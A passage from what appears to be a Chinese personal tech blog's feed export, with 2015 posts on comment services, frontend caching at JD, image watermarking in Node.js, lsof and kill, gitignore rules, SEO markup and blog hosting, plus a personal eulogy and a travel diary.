    <content type="text"><![CDATA[看到有人邮件给我，说是多说挂了，只好发邮件交流下，打开博客瞅了瞅，果然… 从最开始使用 wp 的评论，到自己写评论组件，再到托管到多说。总得感觉让别人来服务自己，轻松不少。多说是一个免费的社会化评论组件，看其 API 的形式与 disqus 差不多，估计很多地方也是参考了 disqus。 我以前是 disqus 用户，虽然国内访问有时候比较缓慢，甚至根本被墙，但体验相当不错，尤其是侧边滑出来的一个评论历史，感觉相当丝滑。看了多说网的官微，确实已经提前向用户说明了： [故障通知] 今天因为机房网络故障，正在排查，影响部分用户的使用。由此给大家带来的使用不便非常抱歉。 也说： 「服务维护通知」为了提升多说整体的服务质量，9月15日周二凌晨00:00至06:00多说将进行升级维护，届时将中断服务。给大家的使用带来的不便，非常抱歉！ 可是，却没有及时处理好问题： 引来了众人的不满。不过吧，人家一个免费工具，出点问题而且也在紧急修复，是可以理解的。抱着理解万岁的情绪，先给自己博客换上老东家 disqus 相比多说，DISQUS 有两个稍微让人揪心的问题： 部分朋友英文水平不是很高，所以在对 disqus 做配置，或者遇到问题，查看 disqus help 的时候，觉得头偏疼 DISQUS 有时候被墙掉了，毕竟是国外的东西，估计在国内也没有 CDN，加载速度慢，甚至被墙了 优点，能枚举的实在是太多了： DISQUS 在技术和文档上花费的心思比多说团队要多很多，人家论坛都做起来了，而且还有小圈子 DISQUS 的 API 更加丰富，开发者基本可以只把 DISQUS 作为评论内容的数据库，在前端来操作数据库的曾删改查。这里，屈屈给出了一个建议，不是说国内部分用户访问被墙么，我们可以将 DISQUS 的 API 封装成一个包，直接在后端服务器上跑，虽然麻烦了点，也不失为一个好办法~ 体验啊，多说的体验做的实在是跟着外国货有差距！ … 看到多说团队的招聘了，看来也是一直比较缺人的： 帮忙顶一脚吧~]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>多说评论</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[祭忘年之交文]]></title>
    <url>%2Fblog%2F2015%2F09%2F11%2F2015-09-11-prayer-the-bicycle-repairing-man%2F</url>
    <content type="text"><![CDATA[忘年之友离世，心中只有伤悲，祭文缅怀。 哀维：乙未年，五月廿二，血压骤高，闻病就医，破脑救治，卧榻五日，不得而治，临行之际，思吾至深，含愁离世，享年五旬。顾及二子，奔波劳碌，路边一隅，修擦补车，十载有余，笑面迎人，思之伤痛，呜呼哀哉！携酒已至，阴阳相隔，只得独饮，伤痛欲绝，呜呼哀哉！呜呼老友，百喊不闻，肝肠断绝，哀号祭奠，悲痛难陈。呜呼哀哉！伏维尚飨！– 靖，于乙未年七月廿九 10年九月份，初次踏进华中科技大学校门，感觉很新鲜很陌生，这个诺大的学校让我有购买一辆自行车的冲动，于是我认识了驻扎在韵苑体育馆侧墙边上的任师傅。那时候我还不知道他的姓氏，总唤他为”修车老头儿”。 …本来想写一篇长文祭奠… 一切尽在不言中。]]></content>
      <categories>
        <category>随笔</category>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>祈祷</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[做回一天学生]]></title>
    <url>%2Fblog%2F2015%2F09%2F11%2F2015-09-10-travel-back-to-hust%2F</url>
    <content type="text"><![CDATA[去年年假还剩 6 天，再不休假就要作废了，本着一颗回归的心，很豪气的一口气请了三天假，加上周末两天，五天时间打算在踏入社会的大学校门口度过。于是，就下榻在了关山口职业技术学院门前。 进入酒店那一刻，没有在门缝中看到小卡片，感觉十分舒心，”这应该是家正规酒店”，心想。放下行李之后，直奔校园，步子迈的十分轻盈，感觉好爽。在来华科的路上，我很就严肃的思考了接下来几天的行程。然并卵，计划赶不上变化。本打算先去会一会一位忘年交（韵苑修车老头），结果被好友劝去武汉大学。 去武大的路上，因顾着跟好友扯淡，错过了一站，庆幸的是，我们还能从错过的这站抄小道过去，于是看到了立在小道跟前的旧牌坊： 没有逼格闪闪，倒还剩下些历史的沧桑感。武大门口等着久别的好友，出去吃了顿饭。朋友从德国留学回来，从她那儿顺道学了句德语：/yixi&#39;libodish/，然后把这句话送给了女朋友。其实我也不知道发音标不标准，只知道这是”我爱你”的意思。朋友带了些礼物，发给了在场的其他朋友，她说是香水，闻了闻，确实不错，遗憾的是我不太用这玩意儿~ 吃完饭就在武大门口打了个 uber 回华科，user 司机是个武汉人，不太说普通话，嘀咕了半天才搞清楚我们在哪里。其实我听得懂武汉话，也会说两句，只是武大的校门有点多，把司机搞晕了。 上图是武大正门，还吊着两个大灯笼，着实丑爆了，武大的校训： – “自强弘毅，求是拓新”。 我们华科的校训，我记得很清楚：“明德厚学，求是创新”，这几个字好像深深地刻在脑子里，张嘴就出来了。 返校之后，差不多已经九点半了，我下午四点才到武汉。又约了另一位同学，在校园某个角落点了杯咖啡，座谈了一个多小时。回去的路上，有看到了熟悉的一幕： 重点请放到那辆车上，很明显，座板是新加上去的，很符合我们华中渴基大学男同胞做事的风格。其实，当年我也这么干过，只是后面坐了四年男生，最后车子还被偷了。现在很后悔后面加一个座板，并没有什么卵用。 以上。这仿佛就是我大四的生活写照。做回了学生，感觉真好。 还有三天半，后面要约的童鞋，你们准备好了么？菊花洗干净，等着。 对了，今天是教师节。老师们，节日快乐！打过电话、发过红包的，不谢；没打电话、没发红包的，可能是手机快没有电费了=。 =]]></content>
      <categories>
        <category>随笔</category>
        <category>观点和感想</category>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>教师节</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[京东首页前端技术剖析与对比]]></title>
    <url>%2Fblog%2F2015%2F09%2F09%2F2015-09-09-jd-architecture-analysis%2F</url>
    <content type="text"><![CDATA[逛京东的时候开着 chrome 控制台，无意间看到了下面这串似曾相识的代码， 再看了下 localstorage， 看到这些内容，其实京东首页的前端架构雏形就出来了。 JD 使用 seajs 作为模块加载器，使用 jd-jquery 为基本库，看到它的 jq 版本是 1.6.4， 对比了下”正版” jquery-1.6.4 的源码，很显然，JD 使用的是自己造的轮子，这说明京东的前端生态应该是十分完善的，有轮子就会有很多组件、插件，这对一个公司批量造网页很有裨益。 前后端情况电商的主页都是以呈现为主，展示各个横向市场和纵向市场的入口，也可能会有一些个性化（所谓个性化，就是给不同的用户推荐不同的内容）的推荐。它不像交易、详情等页面，页面逻辑后端重而前端轻，后端需要做各种内容推荐、数据校验、类型判断等工作，而前端更多的是将后端的信息有序地呈现出来。 首页则不同，首页承载了大量的二级页面入口和一些频道的推荐内容，而这些数据更多的是由运营去维护，可以认为数据是死的，就算存在一些个性化的数据，也会使用 jsonp 的形式去加载，前端需要快速高效地处理这些数据，可见前端任务相当艰巨。加上作为一个网站的门面，它的安全稳定性也是极为重要的。 如果没有猜错，京东后端也有一个中间层，中间层负责组装数据，以模块为单位，根据前端的请求响应对应模块的内容，而数据是在另外一个运营平台上维护，运营填好的数据会即时的推送到 CDN 或者应用，中间层拼合数据。看不到的东西就不猜测了，我们来看看京东首页的整体结构。 前端技术简要分析如果希望一个网站跑起来飞快，你觉得怎么做最靠谱？ 我们都玩过微博，都上过手机淘宝，进入这些 app 应用，会发现很多页面几乎看不到加载的痕迹，因为他们是本地应用，很多图片、脚本、样式都已经打包在本地了，所以加载起来速度是很快的。如果希望一个网页也能飞奔起来，同样的道理，让请求的个数少一点，让请求的内容少一点。还有一个至关重要的，让那些次要的内容慢一点加载（我们称之为懒加载）。 前端缓存和异步加载京东在按需加载和数据缓存上的工作做的十分到位。 每个具有 lazyload 异步标识的模块，都包含两个属性，一个是渲染该模块需要的内容（数据+JS），一个是这个内容过期的时间，只要内容不变就不会过期，所以这里使用的是文件 hash 来标注。 把需要请求的路径写在 dom 上，用户滚动时，一旦该模块进入了视窗，则请求 dom 上对应的 data-path 地址，拿到渲染这个模块所需要的脚本和数据，不过这中间还有一层本地缓存 localstorage，如果在本地缓存中匹配到了对应的 hash string 内容，则直接渲染，否则请求到数据之后更新本地缓存。dom 上的 data-time 会在页面加载时候，后端计算文件 hash，hash 不变则输出内容也不变。 这里其实存在两个请求，一个请求是加载数据和脚本，而这里的内容是： 1234567&lt;div&gt;&#123;html&#125;&lt;/div&gt;&lt;script&gt;var data = &#123;JSONSting&#125;;seajs.use('path/to/$version$/script.js', function(Script)&#123; Script.init(data);&#125;);&lt;/script&gt; 为啥不在返回的内容中直接把脚本也输出出来？为了让数据充分缓存下了不少功夫。数据的变化频率比较高，如果数据和初始化脚本包装在一起，虽然节约了一个请求，但一旦数据变化，整个脚本都得重新加载，而将数据和脚本分离，脚本可以长期缓存在本地，单独请求数据，这个量会小很多。直接改变上面的 version 版本号便可以让浏览器重新请求最新脚本。 从上面可以看出，任何一个模块的改动，在前端只会引起一个较小的加载变化，加上 http 的缓存策略，服务器的压力也是很小的。 工程结构比较常见的工程结构，如下： 1234567891011121314.├── build/└── src/ ├── widgets/ ├── mods/ | ├── moduleA/ | | ├── index.js | | ├── index.tpl | | └── index.less | ├── moduleB/ | └── moduleC/ ├── index.js ├── index.tpl └── index.less 所有 mods 中的 tpl 文件通过一些标签，引入到 src/index.tpl 中，需要同步渲染的模块信息直接引入，而异步渲染的模块内容，比如 moduleA/index.tpl，其内容就十分简单： 1234&lt;div lazyload data-path=&quot;&lt;% moduleA %&gt;&quot; data-time=&quot;&lt;% md5(moduleA + getData()) %&gt;&quot;&gt;&lt;/div&gt; 只引入一个模块钩子（hook），然后按需加载/懒加载这个模块钩子内容。相比 JD 采用的也是类似的模型。 横向技术对比看看上面列出的目录结构，一般情况下，为了减少网页的请求数，我们会把所有 mods 和 wedgets 中的 js 和 css 分别打包成一个文件，然后前端 combo 请求，提前加载但是懒执行，这是 CMD 的思维方式。而京东使用了更懒的方式：懒加载并且懒执行。 这种方式带来的好处就是，单个模块的更改，前端只更新一小部分缓存；而提前加载所有模块的方式，任何一个模块有改动，整体都得重新下载。脚本懒加载的缺点是，需要发起请求，如果需要加载多个模块，则需要发起多个脚本请求，可以看到，快速拖动 JD 首页，模块的加载速度不容乐观。当然，脚本是可以被浏览器缓存的，这个问题也就是首次访问或者清空了缓存才会出现。 对请求控制如此严格，怎么就没考虑下优化源码当中的两大段 css 和 js 代码呢？是不是也可以把 css 和 js 放到 localstorage 中，减少请求数。 源码中通过函数去加载资源： 1234var loadCss = function()&#123; var style = loadFromLocalstorage(); inserCss(style);&#125;; 如果 localstorage 中不存在，也不需要重新发请求，后端脚本通过 cookie 判断是否需要同步输出代码： 1234// 伪代码if(cookies(&apos;cssV&apos;) || cookie(&apos;cssV&apos;) !== &apos;setsV&apos;)&#123; echo CSSCode;&#125; 如果发现 cookie 中的版本号与设定的版本号不一样，或者没有 cssV cookie，则同步内联输出 css 和 js。 小结本文只是对京东首页用到的部分技术做一个简要的分析，页面加载速度确实十分可观，赞！ 随着需求的多元化和终端设备的多元化，前端技术在 web 舞台上一直展现着优美的身姿，她在进化、在演变，几乎每隔一两个月就能听到新的前端技术出来，所以学是学不过来的，前端的学习就两个字：”理解为什么”。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>京东</tag>
        <tag>技术架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodejs给图片批量加水印]]></title>
    <url>%2Fblog%2F2015%2F09%2F08%2F2015-09-08-add-watermark-to-images%2F</url>
    <content type="text"><![CDATA[本只是想给博客添加个水印，github 上搜索了半天，找了一个比较小巧的库，叫做 images。 这个库的地址是：http://github.com/zhangyuanwei/node-images，它是一个跨平台极为轻量的图片编解码工具，同时附加了一些图片的操作函数，如： .size() 比例伸缩 .draw(img, x, y) 在图片上绘制一个图片 .encode() 将图片解码到 buffer 中 给图片加水印主要就用到了 .draw() 函数。 首先需要安装 images 库： 1npm install images 然后开撸，基本代码如下: 1234567891011121314151617var images = require('images');var path = require('path');var watermarkImg = images(path.join(__dirname, 'path/to/watermark.ext'));var sourceImg = images(path.join(__dirname, 'path/to/sourceImg.ext'));var savePath = path.join(__dirname, 'path/to/saveImg.jpg');// 比如放置在右下角，先获取原图的尺寸和水印图片尺寸var sWidth = sourceImg.width();var sHeight = sourceImg.height();var wmWidth = watermarkImg.width();var wmWidth = watermarkImg.height();images(sourceImg) // 设置绘制的坐标位置，右下角距离 10px .draw(watermarkImg, sWidth - wmWidth - 10, sHeight - wmHeight - 10) // 保存格式会自动识别 .save(savePath); 晒一张本博客的一个水印截图： 看到右下角的水印了么 ；） 至于批量加水印，额，for 循环吧，while 循环也行=。 =]]></content>
      <categories>
        <category>JavaScript</category>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>npm</tag>
        <tag>水印</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unix下的文件操纵]]></title>
    <url>%2Fblog%2F2015%2F09%2F07%2F2015-09-07-lsof-in-xnix%2F</url>
    <content type="text"><![CDATA[unix/linux 下的命令太多了，花时间系统去学肯定十分枯燥，平时有需求用到某些命令的时候就会将这个命令所有的功能都看看，这次是为了关掉某个端口的进程，学习了下 lsof 和 kill 命令。 在 sublime 中配置了开启 node 的快捷方式，Command + B 可以直接执行正在编辑的 js 文件。多次由于操作不当，报错： 123456Error: listen EADDRINUSE at exports._errnoException (util.js:746:11) at Server._listen2 (net.js:1156:14) at listen (net.js:1182:10) at Server.listen (net.js:1267:5) ... 意思就是端口被占用 EADDRINUSE，即 “Error: Address in use”，这里为啥唤作 address 而不是 port 被占用，还是有说法的。 在 linux/unix 下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。如 TCP/UDP 套接字，应用程序都会在系统目录下为期分配一个文件描述符，这个描述符就是程序和系统交互的接口。 lsof 命令lsof 是 *nix 下常用的一个命令，全称为 “list open file”，列举被打开的文件描述符的相关信息，包括： -u 用户，如 root -c 进程名，如 chrome -g gid -p pid -a and 的意思，满足多个条件过滤 -i 端口号 还有几个就不列举了，对一般用户来说并不常用。一次命令的执行，程序会吐出这些信息： 12345➜ blogsys ✗ lsof -i :4001COMMAND PID USER FD TYPE NODE NAMEGoogle 57881 barretlee 113u IPv4 TCP localhost:52445-&gt;localhost:newoak (ESTABLISHED)node 68004 barretlee 11u IPv6 TCP *:newoak (LISTEN)node 68004 barretlee 18u IPv6 TCP localhost:newoak-&gt;localhost:52445 (ESTABLISHED) 中间还有一个 DEVICE 和 SIZE，被我删掉了。从上面可以看到包含如下信息： COMMAND 对应我们上面提到的 -c PID 对应 -p USER 对应 -u NAME 被打开文件的名字 FD、TYPE、NODE 就不细说了，可以看下面两篇参考文章 通过前面的参数，可以筛选被打开的文件。 关闭开启的端口通过 lsof 的端口查找参数找到 pid 或者 command： 1lsof -i :4001 比如我们找到的 command 是 node， pid 为 73220，则可以通过下面的方式关闭端口： 12kill -p 73220pkill node 另外还有 killall、xkill 等命令，可以阅读 4 Ways to Kill a Process – kill, killall, pkill, xkil 参考文章 linux lsof详解 linux 系统监控、诊断工具之 lsof 用法简介 4 Ways to Kill a Process – kill, killall, pkill, xkil]]></content>
      <categories>
        <category>工具</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>lsof</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用对 gitignore]]></title>
    <url>%2Fblog%2F2015%2F09%2F06%2F2015-09-06-set-gitignore-after-add-file%2F</url>
    <content type="text"><![CDATA[使用 git 做代码管理工具时，设置 gitignore 是必不可少的流程，一些系统或者 IDE 会在目录下生成与项目不相关的文件，而这些文件我们不期望被提交到仓库之中。理解 gitignore 的 pattern 规则十分重要。 Pattern 规则关于 Pattern 规则，可以查看 git 的相关文档：http://git-scm.com/docs/gitignore，大致有以下几点： 空行不匹配任何内容，所以可以作为块分隔符； # 开头表示注释，如果相匹配 #，可以在前面加一个反斜杠，即 \#； 除非加了反斜杠，否则一连串的空格会被忽略； 如果在匹配的内容前面加上 !，则这些匹配过的部分将被移出，如果要匹配以 ! 开头的内容，需要加上反斜杠，如 \!important.txt； 如果一个匹配 pattern 后面有一个斜杠，如 foo/，则默认会匹配所有（包含父子文件夹）中的 foo 文件夹内容，并且它不会匹配单个的文件； 如果一个匹配 pattern 不包含斜杠，如 foo，Git 会将其作为一个 shell 的查找命令匹配内容。 需要注意的 **： 如果一个 pattern 以 ** 开头，如 **/foo，最后会匹配所有文件夹下的 foo 文件(夹)； 如果一个 pattern 以 /** 开头，如 abc/**，则表示匹配 abc 目录下的所有内容； 如果一个 pattern 中间包含 **，如 a/**/b，则会匹配 a/b、a/x/b、a/x/y/b 以及所有类似的内容。 gitignore 相关的问题匹配示例如果我们要匹配 ‘foo’ 目录下除去 ‘foo/bar/‘ 的内容，可以这样做： 12foo/!foo/bar/ 如果要匹配所有目录下的 node_modules 文件夹，只需要这样做： 1node_modules/ 如果要匹配所有的 json 文件，可以这样做： 1*.json git 操作中，add 之后再加入 gitignoreGit 操作中经常会出现这样的问题，当我们 git add 之后，突然想起来要添加一个 gitignore 文件，但是一些诸如 node_modules/, cache/ 等文件已经被 add 进去了，这些文件不会被 ignore 掉，怎么办？ 最直接的方式是： 1234# 这一步的操作相当于回到 git add 上一步git rm -r --cached .# 然后重新 addgit add --all . git 添加空文件夹Git 默认是不添加空文件夹的，如果一定要加入这个文件夹，有以下方案： 1）在文件夹添加文件，然后删除 2）在文件夹中添加一个 .gitkeep 文件 让 git 不要添加 gitignore 文件如果在 .gitignore 文件中添加 1.gitignore 你会发现，并没有起作用， .gitignore 文件依然被加到了 git 中，为什么会有这个需求呢？有些人在本地开发的时候有一些其他的文件夹名不愿意让别人看到，虽然在 gitignore 中被忽略了，但是 .gitignore 文件中依然可以看到这些文件夹名字。 其实没有什么好的办法处理这个问题，.gitignore 做多人协作开发的时候可以直接根据同一份 gitignore 过滤文件，如果一定要做，可以从 add 中在 remove 掉： 1git rm --cached .gitignore Git 操作涉及的命令巨多，但是日常开发中用到的就那么几个，把原理搞清楚，用起来得心应手。]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>gitignore</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站的SEO以及它和站长工具的之间秘密]]></title>
    <url>%2Fblog%2F2015%2F09%2F02%2F2015-09-02-webmaster-in-baidu-and-google%2F</url>
    <content type="text"><![CDATA[博客迁移没有注意 URL 地址的变化，导致百度和 google 这两只爬虫引擎短时间内找不到路。近段时间研究了下国内最大搜索引擎百度和国际最大搜索引擎google的站长工具，说下感受。 百度的站长工具地址：http://zhanzhang.baidu.com/dashboard/index google 的站长工具地址: http://www.google.com/webmasters/tools/home 最近墙的比较厉害，google 不一定能访问进去（我平时用的 GreenVPN，还挺不错的，速度快，支持的国家也多）。 站长工具的作用是为了辅助开发者，针对自己的网站做出更加合理的网页布局和代码优化，以便让 spider 更好地理解网页，从而将最准确的信息送达到用户的荧屏上。它对搜索引擎和开发者是双赢的。 Web 发展极快，由于客户端厂商纷纭加之开发者没把重点放在 web 标准上，直到 2014 年的 10 月底才有了统一的标准。用户输入关键词，搜索引擎要在 0.1s 内将网络上的资源汇聚起来，这个过程中计算的开销、数据整合的开销是极大的，如果我们开发的网页不能让 spider 准确理解，最后的结果就是，写的东西很难出现在用户面前。 搜索引擎对网页的理解摸索两个站长工具，感触最深的是结构化数据(Structured Data)，结构化数据不是把文章段落分清楚、标题写清楚，实际上你文章段落分的再清晰，爬虫机器也不知道你在表达什么，所以数据结构化是给爬虫看而不是给人看的。HTML 标签的数量很有限，有限的几个标签没办法表达网页上每一个元素的含义，比如一个小的图标、一个广告位、一个蒙层等，于是网页上出现了很多 class 名、id 名来标记一个元素。这些内容的统一让爬虫理解的略微透彻了一些，比如: 123456.banner: 一张banner广告位.sidebar: 侧边导航栏.nav: 主导航.icon: 页面小图标.post: 一篇文章.post-title: 文章标题 然而搜索引擎聚合的网页太多，当这些五花八门的 class 出来之后，它又开始迷茫了，难以较好的聚合分类。所以出现一个叫做 Schema 的东西，它用来表示一个结构化数据结构，可以看下面一个 schema 示例： 12345678910111213&lt;div itemscope itemtype="http://schema.org/Person"&gt; &lt;span itemprop="name"&gt;李靖&lt;/span&gt; &lt;img src="//img.alicdn.com/tfs/TB1oyqGa_tYBeNjy1XdXXXXyVXa-300-300.png" data-original="/blogimgs/2015/09/02/avatar.png" data-source="http://barretlee.com/avatar.png" itemprop="image" /&gt; &lt;span itemprop="jobTitle"&gt;攻城师&lt;/span&gt; &lt;div itemprop="address" itemscope itemtype="http://schema.org/PostalAddress"&gt; &lt;span itemprop="streetAddress"&gt;文一西路969号&lt;/span&gt; &lt;span itemprop="addressLocality"&gt;浙江杭州&lt;/span&gt; &lt;span itemprop="postalCode"&gt;310000&lt;/span&gt; &lt;/div&gt; &lt;span itemprop="telephone"&gt;(0571) 123-4567&lt;/span&gt; &lt;a href="mailto:barret.china@gmail.com" itemprop="email"&gt;barret.china@gmail.com&lt;/a&gt; 李靖的主页: &lt;a href="http://barretlee.com" itemprop="url"&gt;barretlee.com&lt;/a&gt; &lt;/div&gt; 在一个需要表达的块上加上 itemscope 属性和一个 itemtype 属性，itemtype 是有固定值的，具体可以参阅 schema.org 的说明。然后在块内添加详细的说明，使用 itemprop 标注。整个操作十分简单，略微麻烦的是需要对照 schema 的官方网站填写规定的 itemprop 字段。 结构化数据，通常也可以称之为元数据，这些数据附着在网页文本信息内，厘清了页面上每个部件的功能、属性和意义。当机器进入网页的时候，能够像人一样，一眼瞄出要表达的内容。关于 schema ，以前翻译过一篇文章 SEO：让搜索引擎对你的网站更有亲和力。 SEO和站长工具的之间秘密除非搜索引擎能够猜到你要搜索的具体的 URL 地址，一般地，它都会从自己的数据索引库中扒拉数据。对于权重高、更新频率高、原创内容多的网站，搜索引擎会十分勤快的爬最新内容。那么，如何让搜索引擎知道网站上有多少网页便成了一件重要的事情。 我们经常会听到一个叫做”网站地图”的东西。有些网站会在自己的站点中添加一个页面，这个页面包括了整站的重要入口，那么这个页面就是该页面的网站地图。这些地图是给人看的，如果只想给爬虫引擎看，可以将所有的链接按照一定的格式放到 sitemap.xml 文件中，然后把这个文件放到网站的根目录下，如 http://www.barretlee.com/sitemap.xml。 而最重要的还是 robots.txt 这个文件，它是所有引擎约定俗成的一个文件，比如我的网站中用到的 http://www.barretlee.com/robots.txt ，其内容为： 123Sitemap: http://www.barretlee.com/sitemap.xmlUser-agent: *Allow: / 它告诉搜索引擎，网站地址的位置、允许蜘蛛爬取的内容等，它是一个协议。最近，貌似还多了一个 humans.txt，也是一个比较有意思的文件，可以在这里了解它：http://www.humanstxt.org.cn/，它可以描述一些站点和团队的故事。 SEO上，站长工具主要分为两个方面，一个是对网页的抓取，一个是对网页的分析。 网页的抓取在百度站长工具中体现的比较多，而网页的分析，诸如数据标注、结构化数据等，百度做的还比较搓，目前还在内测阶段，需要发送邮件才能申请权限。看到百度站长工具页面上的几个数据标注示意图，揣测应该比 google 弱一百倍，所以我还是重点说说 google 的吧。 网页的抓取这块上，两个站长工具都是强调让开发者把网站地图显式的暴露给搜索引擎，提供了各种分析网站地图准确性合理性的工具，搜索引擎如果发现你的网站上一个地址时有时无，就会觉得你不可信有点飘渺。所以一旦网页因为改造或迁移导致页面链接丢失，可以在站长工具中填写这些死链。 不要贪婪的让搜索引擎不停的爬取你的网站，如果它多次过来发现内容是一样的，它也会很伤心的离开。而如果它发现每次过来爬你的内容都能找到很有意思的、从来没发现过的东西，它会对你越来越感兴趣，甚至日久天长它会给你定型、定位，然后权重会越来越高。在站长工具上都是可以设置的。 网页的分析google 的数据化标记做的实在是太赞了！输入网址，它会打开你的网页，设置你要标记的类型，比如文章。选中页面上的元素然后标记。比如选中文章的标题，选中之后有一个菜单，在菜单上选择 title，选中作者名字，然后菜单上选择 author，一个页面标记完了之后，他会分析整站的所有页面，如果结构相似，也会自动标记其他页面。 整个标记完成之后，google 就知道你整个网站的信息架构了，下次要做的就是对这些信息内容做匹配和分类。所以我们可以看到，个人博客在 google 中的搜索是极其靠前的，因为页面的信息结构简单，即便你不去标记，它爬取多次之后也能自己理解。 对比百度和 google ，两者如同屌丝和高富帅。不过高富帅总是要越墙才能看到，所以我平时使用的依然是百度分析。百度分析和百度站长工具还是不一样的。百度对网页流量的分析和搜索词汇的分析还是挺精准，也很有参考价值。 小结本文对 SEO 相关的东西做了一个简要的概述，同时也概括了搜索引擎做的一些工作，知识量有限，难以面面俱到，如有错误还请斧正。]]></content>
      <categories>
        <category>观点和感想</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>SEO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[按照这样的流程玩博客，最后都到了这里]]></title>
    <url>%2Fblog%2F2015%2F08%2F31%2F2015-08-31-migrate-blog-to-hexo%2F</url>
    <content type="text"><![CDATA[前几天看到 Nicholas C.Zakas 大师把自己的博客从 wordpress 迁移到了 jekyll，很巧的是我这几天也在干这件事情。不过我是迁移到 hexo，刚开始托管在 github，后来改到 gitcafe。 之前我捯饬过很多博客系统，也喜欢了解各个博客系统的实现方式，并且自己写插件、写主题。由于最开始接触的一门 web 后端语言是 php，所以先折腾小而美的 wordpress，后来发现它并不小，一堆插件、一堆漏洞让这个系统变得臃肿，而翻开这些插件的源码，实在是不怎么样，系统的性能很大程度是被这些插件搞糟糕的。不过，让我放下 wordpress 的主要原因不是它的臃肿…我玩它的时候还是个学生，不想花钱购买空间和数据库，当时百度云还没有出来，SAE 的体验也比较差。 到”这里”之前后来学会了使用 git，刚开始对 git 命令并不熟悉，记得在 github 上弄一个 ssh key 折腾了良久，最后不得不安装一个 windows 版本的 github 客户端，让客户端解决我 push 代码的难题。按照阮一峰写的一篇 关于如何使用 github pages 的文章，部署了一个博客。 当我把 jekyll 的文档看完了之后（刚搜到有中文版的了，这年代啥玩意儿都有中文版…），又搞了一个清爽版本的博客，这个博客上我做了一个很方便连接，在页面中按下 Ctrl + Shift + Enter 或者在网址后面加上 ?edit 可以看到，每篇文章都有一个对应到这篇文章的 github 编辑地址，这样就可以完全放下本地工具，直接云端操作了。 Github Pages 玩熟之后，下一步要做的就是，抛弃它——程序员爱折腾。当然我并没有完全抛弃，http://hi.barretlee.com 这个网站也时有上去更新。不过现在它的内容已经被合并到本网站下了，后续便不会再光顾。Github Pages 上每次都要维护点、修改点内容，从本地到 github 再到我的网页上，整个流程显得有点长，太麻烦。 后来索性就入驻了博客平台，博客园，这一入就是两年多。博客园团队把写作体验和分享内容做到了极致，百度上随便搜一个技术性相关的知识点，都能看到博客园的身影。虽然 SEO 会把年老页面的权重提升，但是没有创新内容网站是活不下去的，我也在博客园平台上写了不少的文章，没想到的是也引来了一千多的粉丝。 还是买主机吧一直想有一个个人网站，所有的内容都是自己支配，增加一个个性页面、博客后台换个语言、用用 websocket 等等，于是毕业之后自己买了一个主机，肆意倒腾。在主机上，重新回顾了 Linux 的操作（大学使用 windows/Linux），学习了 Nginx 的配置、Apache 的配置、负载均衡等等，也使用 NodeJS 搞了一个 websocket 的聊天室，当然，也少不了搭建一个博客系统。使用的是 Ghost，一个相当不错的博客平台，我非常喜欢它后台编辑博客的系统，支持 Markdown 并且很好的处理了图片的上传，体验很赞！同时也部署了一个 hexo 写写生活琐事，用的是官方一个比较简约的主题。感觉也一直挺好的。 可以一年下来，又到了续费的时间了。可是回头想想，我用这些资源都干了什么事情呢？除了刚买主机那会儿兴奋了一阵子，后边大半年都没上过那台机器。着实太浪费了！每年上千块（我买的是很低的配置），就是放几个很少更新的博客文章，所以再也没啥续费的动力了。 期间也用了 SAE 和 BAE，SAE 使用的云豆，买点云豆如果网站没啥流量，十块钱够用一两年。而 BAE 略坑一点，它计算的是你占用的服务器资源，根据一定的算法每个月将账单发到你的手机和邮箱，让你交钱，如果流量不大，每个月也就几十块，可以设置自动续费。不过，想想，其实 BAE 也挺坑的，一年下来收我几百块，虽然不多，但想着还是觉得没多大劲。 我又放弃了于是我又开始了下一波的折腾。趁着阿里云主机到期之前的半个月，把散布在各处的博客整合下。也就是您现在看到的这个博客内容。简约、明了，风格上学习了简书的布局、设计上参考了阮一峰同学的博客。包括整合各处博客，格式化博客内容，编写主题，调试页面等，花了整整三天时间，够呛的！不过，按照之前玩转博客的时间情况，可以确定，这个设计和博客的部署至少会伴随我五到十年。 刚开始我把这个基于 hexo 构建的博客部署在 github 上，我在家里打开速度还过得去，2-3s，但是放到群里，让朋友们测试了下，有的喊出了 20s 的加载时间，这着实让我大吃一惊，果然 github 这种外国货还是不适合我们，于是在 阿安 的建议下，又将部署地址换到了 gitcafe。为了方便让 github 的用户顺利迁移到 gitcafe，gitcafe 的几乎就是一个 github 的复制品，包括创建 gitcafe pages，在仓库中弄一个 gitcafe-pages 的分支就行了。不过，说句良心话，gitcafe 的体验略好；） 静态博客，找地方托管我想，找个地方托管静态博客，这将是我们博客最终的归属。阮一峰说写博客的人会经历三个阶段： 第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。 第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。 第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。 其实 博客园 就是第三阶段的实践平台，博客园中我看到了很多不错的博客版式设计，让人吃惊的是，这些版式的设计几乎没有任何限制，你完全可以天花乱坠的按照自己的风格搞设计，但前提你要懂点设计和 css。 不过我更希望有一个自己可以放开瞎捣鼓的地方。所以我选择 hexo/jekyll/wp，但是也希望别人来管理我的博客，所以选择了 github/gitcafe。如果你想拥有一个个人网站，你可以这么做： 注册一个 github 账户 abc 新建一个仓库 xxx 写一行代码 This is my blog. 到 index.html， 提交到 gh-pages 分支 预览 http://abc.github.io/xxx，你会发现，你的个人网站已经搞好了 对于这种高效快捷的流程，加上 github 默认对 